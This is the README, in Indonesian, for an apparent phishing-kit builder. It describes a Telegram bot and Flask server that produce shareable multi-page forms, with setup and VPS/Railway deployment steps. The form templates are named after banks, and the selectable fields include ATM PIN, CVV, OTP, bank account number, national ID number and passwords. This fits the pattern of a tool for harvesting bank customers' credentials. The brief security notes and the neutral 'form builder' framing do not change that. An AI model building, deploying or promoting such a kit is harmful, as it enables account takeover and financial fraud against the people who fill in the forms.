# 📋 FormGen — Bot Form Builder Multi-Halaman

Sistem lengkap untuk membuat form online multi-halaman via Bot Telegram.

## ✨ Fitur

- ✅ Setup form via Bot Telegram
- ✅ Pilih template (Bank A, Bank B, Custom)
- ✅ Pilih kolom dinamis (Nama, NIK, No.Rek, No.HP, dsb)
- ✅ Multi-halaman support
- ✅ Generate link shareable
- ✅ Multi-user (setiap user bisa buat form sendiri)

## 🚀 Quick Start

### 1. Clone Repository
```bash
git clone https://github.com/ffuka520-del/Teleform.git
cd Teleform
```

### 2. Install Dependencies
```bash
pip install -r requirements.txt
```

### 3. Setup Bot Token
- Chat [@BotFather](https://t.me/BotFather) di Telegram
- `/newbot` → dapatkan TOKEN
- Copy `.env.example` ke `.env`
- Isi `BOT_TOKEN` dan `BASE_URL`

```bash
cp .env.example .env
# Edit .env dengan token bot kamu
```

### 4. Jalankan Bot & Web Server

**Terminal 1 - Bot Telegram:**
```bash
python telegram_bot.py
```

**Terminal 2 - Web Server (port 5000):**
```bash
python app.py
```

### 5. Test di Telegram
- Cari bot kamu di Telegram
- Ketik `/start` → ikuti alur

## 📖 Alur Penggunaan

```
User → /start
Bot  → Pilih template: [🏦 Bank A] [🏛️ Bank B] [⚡ Custom]

User → Klik template
Bot  → Pilih kolom halaman 1: [✅Nama] [NIK] [No.Rek] [No.HP] ...

User → Klik kolom (bisa multiple)
Bot  → Update centang ✅

User → Klik "Halaman Baru"
Bot  → Halaman 2 dibuat, ulangi memilih kolom

User → Klik "Selesai"
Bot  → 🎉 Link form: https://your-domain.com/f/ABC123
       [🔗 Buka Form] [✈️ Bagikan]
```

## 📋 Kolom Tersedia

- 👤 Nama Lengkap
- 🪪 NIK / KTP
- 💳 No. Rekening
- 📱 No. HP
- 💴 No. ATM
- 🔐 PIN ATM
- 📧 Email
- 📅 Tanggal Lahir
- 🏠 Alamat
- 🔑 CVV
- 🔢 OTP
- 🖥️ Username
- 🔒 Password

## 🌐 Deploy

### Deploy ke Railway
1. Push ke GitHub
2. Create New Project → Deploy from GitHub
3. Add Environment Variables:
   - `BOT_TOKEN` (dari @BotFather)
   - `BASE_URL` (URL Railway app kamu)
4. Start command: `python telegram_bot.py`
5. Jalankan web server di Railway instance lain atau pakai Flask built-in

### Deploy ke VPS (Linux/Ubuntu)
```bash
# SSH ke VPS
ssh user@your-vps

# Clone repo
git clone https://github.com/ffuka520-del/Teleform.git
cd Teleform

# Install Python & dependencies
sudo apt update
sudo apt install python3-pip
pip3 install -r requirements.txt

# Jalankan di background
nohup python3 telegram_bot.py > bot.log 2>&1 &
nohup python3 app.py > app.log 2>&1 &

# Cek status
jobs -l
tail -f bot.log
```

## 🔐 Catatan Keamanan

- Jangan simpan password/PIN asli pengguna
- Gunakan HTTPS di produksi
- Data form encoded di URL (tidak aman untuk data sensitif)
- Untuk data sensitif: implementasikan database terenkripsi (Supabase/PostgreSQL)
- Jangan commit `.env` ke GitHub (sudah di `.gitignore`)

## 📁 Struktur File

```
Teleform/
├── telegram_bot.py      # Bot Telegram (config + handlers)
├── app.py               # Flask web server + form viewer
├── requirements.txt     # Python dependencies
├── .env.example         # Template environment variables
├── .gitignore           # Git ignore file
└── README.md            # File ini
```

## 🛠 Development

### Menambah Kolom Baru
Edit `AVAILABLE_COLUMNS` di `telegram_bot.py`:

```python
AVAILABLE_COLUMNS = {
    "kolom_baru": {"label": "🎯 Label Kolom Baru"},
    ...
}
```

### Menambah Template
Edit `TEMPLATES` di `telegram_bot.py`:

```python
TEMPLATES = {
    "template_baru": {"name": "📌 Nama Template", "desc": "Deskripsi"},
    ...
}
```

## 📞 Troubleshooting

### Bot tidak merespons
- Pastikan `BOT_TOKEN` benar (dari @BotFather)
- Jalankan `python telegram_bot.py` dan cek error log
- Pastikan internet connection aktif

### Form link tidak bisa dibuka
- Pastikan `BASE_URL` di `.env` sesuai dengan domain/host kamu
- Pastikan web server (`app.py`) berjalan
- Cek port 5000 tidak ter-block

### ImportError: No module named 'telegram'
```bash
pip install -r requirements.txt
```

## 📄 Lisensi

MIT License - Bebas digunakan untuk keperluan apapun

## 👨‍💻 Author

Created by FormGen Contributors

---

**Made with ❤️ for easy form creation via Telegram**
